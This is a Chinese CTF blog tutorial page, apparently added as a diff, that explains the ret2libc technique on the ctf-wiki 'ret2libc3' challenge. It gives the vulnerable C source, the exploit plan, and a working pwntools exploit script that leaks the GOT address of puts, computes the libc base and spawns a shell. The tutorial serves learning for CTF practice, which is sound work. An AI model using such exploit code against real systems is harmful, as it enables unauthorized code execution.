@@ -1,0 +1,814 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="Pwn基础----ret2libc, F0und">
+    <meta name="description" content="Return2libc0x00 前言Ret2libc，故名思意，return to libc,在PWN中即：修改返回地址使其指向libc中的shell
+参考文章：https://www.freebuf.com/news/182894.htm">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Pwn基础----ret2libc | F0und</title>
+    <link rel="icon" type="image/png" href="/medias/fav.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">F0und</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">F0und</div>
+        <div class="logo-desc">
+            
+            今天不学习，明天变垃圾
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        Pwn基础----ret2libc
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+</style>
+<div class="row">
+    <div class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ctf/" target="_blank">
+                                <span class="chip bg-color">ctf</span>
+                            </a>
+                        
+                            <a href="/tags/pwn/" target="_blank">
+                                <span class="chip bg-color">pwn</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-02-17
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        1.8k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        7 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Return2libc"><a href="#Return2libc" class="headerlink" title="Return2libc"></a>Return2libc</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Ret2libc，故名思意，return to libc,在PWN中即：修改返回地址使其指向libc中的shell</p>
+<p>参考文章：<a href="https://www.freebuf.com/news/182894.html" target="_blank" rel="noopener">https://www.freebuf.com/news/182894.html</a> </p>
+<h2 id="0x10-Return2libc"><a href="#0x10-Return2libc" class="headerlink" title="0x10 Return2libc"></a>0x10 Return2libc</h2><p><em>－－修改返回地址，让其指向内存中已有的某个函数</em></p>
+<p>根据上面副标题的说明，要完成的任务包括：在内存中确定某个函数的地址，并用其覆盖掉返回地址。由于 libc 动态链接库中的函数被广泛使用，所以有很大概率可以在内存中找到该动态库。同时由于该库包含了一些系统级的函数（例如 system() 等），所以通常使用这些系统级函数来获得当前进程的控制权。鉴于要执行的函数可能需要参数，比如调用 system() 函数打开 shell 的完整形式为 system(“/bin/sh”) ，所以溢出数据也要包括必要的参数。下面就以执行 system(“/bin/sh”) 为例，先写出溢出数据的组成，再确定对应的各部分填充进去。</p>
+<blockquote>
+<p><strong>payload:</strong> padding1 + address of system() + padding2 + address of “/bin/sh”</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220145.png" alt=""></p>
+<h2 id="0x20-return2libc-payload"><a href="#0x20-return2libc-payload" class="headerlink" title="0x20 return2libc  payload"></a>0x20 return2libc  payload</h2><p>padding1 处的数据可以随意填充（注意不要包含 “\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of system() 是 system() 在内存中的地址，用来覆盖返回地址。padding2 处的数据长度为4（32位机），对应调用 system() 时的返回地址。因为我们在这里只需要打开 shell 就可以，并不关心从 shell 退出之后的行为，所以 padding2 的内容可以随意填充。address of “/bin/sh” 是字符串 “/bin/sh” 在内存中的地址，作为传给 system() 的参数。</p>
+<p>根据上面的构造，我们要解决个问题。</p>
+<ol>
+<li>返回地址之前的填充数据（padding1）应该多长？</li>
+</ol>
+<p>解决方法和 shellcode 中提到的答案一样。</p>
+<ol>
+<li>system() 函数地址应该是多少？</li>
+</ol>
+<p>要回答这个问题，就要看看程序是如何调用动态链接库中的函数的。当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址。说到确定动态库的内存地址，就要回顾一下 shellcode 中提到的内存布局随机化（ASLR），这项技术也会将动态库加载的起始地址做随机化处理。所以，如果操作系统打开了 ASLR，程序每次运行时动态库的起始地址都会变化，也就无从确定库内函数的绝对地址。在 ASLR 被关闭的前提下，我们可以通过调试工具在运行程序过程中直接查看 system() 的地址，也可以查看动态库在内存的起始地址，再在动态库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。</p>
+<p>最后，“/bin/sh” 的地址在哪里？</p>
+<p>可以在动态库里搜索这个字符串，如果存在，就可以按照动态库起始地址＋相对偏移来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过 getenv() 等函数来确定地址。</p>
+<p>解决完上述问题，我们就可以拼接出溢出数据，输入至程序来通过 system() 打开 shell 了。</p>
+<h2 id="0x30-example"><a href="#0x30-example" class="headerlink" title="0x30 example"></a>0x30 example</h2><p>本题还是来源于ctf-wiki/challenges中的一道pwn题目：ret2libc3</p>
+<p>程序源代码：</p>
+<pre class=" language-lang-c"><code class="language-lang-c">#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+
+char buf2[100];
+
+void secure(void)
+{
+    int secretcode, input;
+    srand(time(NULL));
+
+    secretcode = rand();
+    scanf("%d", &input);
+    if(input == secretcode)
+        puts("no_shell_QQ");
+}
+
+int main(void)
+{
+    setvbuf(stdout, 0LL, 2, 0LL);
+    setvbuf(stdin, 0LL, 1, 0LL);
+
+    char buf1[100];
+
+    printf("No surprise anymore, system disappeard QQ.\n");
+    printf("Can you find it !?");
+    gets(buf1);
+
+    return 0;
+}
+</code></pre>
+<p>程序开启NX保护，未开启栈保护与PIE（地址随机化）</p>
+<p>file属性</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, not stripped
+</code></pre>
+<p>也就是说栈中的数据变得不可执行，我们不能通过填充shellcode到栈里来溢出</p>
+<blockquote>
+<p>那我们怎么才能pwn掉这个程序呢</p>
+</blockquote>
+<p>首先我们需要了解程序的POT表与GOT表，动态链接库，静态链接文件，等这些概念</p>
+<p>我把这些整理到另一篇博客里面了，</p>
+<p>也可以看这篇博客，我那篇ELF文件基础也是使用了他的部分内容</p>
+<p><a href="https://www.freebuf.com/news/182894.html" target="_blank" rel="noopener">https://www.freebuf.com/news/182894.html</a></p>
+<p>回到本题</p>
+<p>与简单的pwn题不同的是，这道题没有提供system()函数，但我们要调用system(“bin/sh”)，才能获取到shell</p>
+<p>并且程序开启了NX保护，我们不能通过填充Shellcode的方式来获取shell,</p>
+<p>但通过我们前面了解到的知识，</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">因为程序是动态链接生成的，所以在程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)，libc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权，而libc.so动态链接库里的函数的偏移是固定的
+</code></pre>
+<p>还有文件属性 <strong>dynamically linked</strong> </p>
+<p>所以要解决这道题我们就要用到ret2libc的方法了</p>
+<p>先说说这道题的利用思路</p>
+<ol>
+<li>程序提供了puts()函数，利用puts函数我们可以泄露出puts函数在GOT表中的地址，或者其他函数也行（程序里）</li>
+<li>得到puts函数在GOT表中的地址以后，我们就可以根据地址的后三位来判断出libc的版本号，（后三位地址是不变的，无论怎么偏移）</li>
+<li>利用泄露出来的puts()函数的地址-libc中puts()的偏移量=libc基础地址（算出libc基础地址）</li>
+<li>system在libc中的偏移+libc的基础地址=system在程序中的位置</li>
+<li>‘/bin/sh’的地址同理推出</li>
+</ol>
+<p>payload:</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">#泄露GOT表
+#payload= 'a'*offset + elf.plt['puts'] + returnaddr + elf.got['puts']
+payload=flat(['a'*112 , p32(elf.plt['puts']), p32(elf.symbols['main']) , p32(elf.got['puts'])])
+
+#puts在GOT表中的地址
+#接收4个字节
+puts_addr = u32(p.recv()[0:4])
+
+libc_base=puts_addr-libc.symbols['puts']
+system_addr=libc_base+libc.symbols['system']
+bin_addr=libc.base + libc.search('/bin/sh').next()
+
+payload='a'*offset +system_addr + returnaddr + bin_addr
+#payload=flat(['a*104',system_addr, 'bbbb',bin_addr])
+</code></pre>
+<p>exp:</p>
+<pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+from pwn import *
+
+elf = ELF('./ret2libc3')
+sh  = process('./ret2libc3')
+libc=ELF('./libc6_2.23-0ubuntu10_i386.so')
+#返回到main函数在执行一次main函数
+payload=flat(['a'*112 , p32(elf.plt['puts']), p32(elf.symbols['main']) , p32(elf.got['puts'])])
+
+sh.sendlineafter('Can you find it !?', payload)
+
+puts_addr = u32(sh.recv()[0:4])
+
+libc_base=puts_addr-libc.symbols['puts']
+system_addr=libc_base+libc.symbols['system']
+bin_addr=libc_base + libc.search('/bin/sh').next()
+
+payload=flat(['a'*104, system_addr, 0x12345678 ,bin_addr])
+
+sh.sendline(payload)
+sh.interactive()
+</code></pre>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
+                    </span>
+                    <a href="https://180CM55KG.github.io" class="b-link-green">F0und</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2020/02/18/ctf/pwn/pwn-re2libc/" class="b-link-green">Pwn基础----ret2libc</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/02/18/html/vue/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/24.jpg" class="responsive-img" alt="Vue3.x 学习记录">
+                        
+                        <span class="card-title">Vue3.x 学习记录</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">期末项目学习记录vue3.x学习引入：
+
+
+
+安装与卸载npm install -g @vue/cli //安装
+npm uninstall -g @vue/cli //卸载
+
+指定版本安装
+3.0以下😔
+
+npm install -g </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-17
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/vue/" class="post-category" target="_blank">
+                                    vue
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/vue/" target="_blank">
+                        <span class="chip bg-color">vue</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/02/18/ctf/pwn/pwn-rop/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="Pwn基础----ROP">
+                        
+                        <span class="card-title">Pwn基础----ROP</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">ROP  (Return Oriented Programming)0x00 ROP－－修改返回地址，让其指向内存中已有的一段指令
+根据上面副标题的说明，要完成的任务包括：在内存中确定某段指令的地址，并用其覆盖返回地址。可是既然可以覆盖返回</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-17
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/pwn/" target="_blank">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+    </div>
+    <div class="col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">29.4k</span>
+            
+
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/180CM55KG/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1845477611@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1845477611" class="tooltipped" data-tooltip="QQ联系我: 1845477611" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
